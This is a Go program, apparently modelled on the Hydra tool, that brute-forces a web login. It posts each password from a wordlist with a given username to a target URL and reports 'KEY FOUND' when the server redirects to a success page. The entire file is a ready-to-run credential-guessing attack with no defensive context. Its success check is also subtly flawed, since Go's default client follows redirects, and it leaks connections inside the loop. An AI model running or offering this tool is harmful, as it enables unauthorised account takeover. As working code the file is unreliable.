package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	// Parse command-line arguments
	if len(os.Args) < 7 {
		fmt.Println("Usage: hydra2.go -l <username> -P <passwordlist> <url> --redirect <success_url>")
		return
	}

	// Extract arguments
	username := os.Args[2]
	passwordListFile := os.Args[4]
	url := os.Args[5]
	successRedirectURL := os.Args[6]

	// Open password list file
	file, err := os.Open(passwordListFile)
	if err != nil {
		fmt.Println("Error opening password list file:", err)
		return
	}
	defer file.Close()

	// Create a buffered reader to read passwords
	scanner := bufio.NewScanner(file)

	// Loop through password list and test each password
	for scanner.Scan() {
		password := scanner.Text()
		fmt.Printf("Trying password: %s\n", password)

		// Build the request body
		req, err := http.NewRequest("POST", url, strings.NewReader("username="+username+"&password="+password))
		if err != nil {
			fmt.Println("Error creating request:", err)
			continue
		}

		// Set appropriate headers (adjust as needed for your application)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// Perform the HTTP request
		client := &http.Client{
			Timeout: 10 * time.Second, // Set timeout
		}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			continue
		}
		defer resp.Body.Close()

		// Check if the response URL is the redirect URL (success)
		if resp.StatusCode == http.StatusFound && resp.Header.Get("Location") == successRedirectURL {
			// If redirected to success page, print the password
			fmt.Printf("KEY FOUND: [%s]\n", password)
			return
		}

		// If no match, continue to the next password
		fmt.Println("KEY NOT FOUND")
	}

	// Check for errors while scanning the file
	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading password list:", err)
	}
}
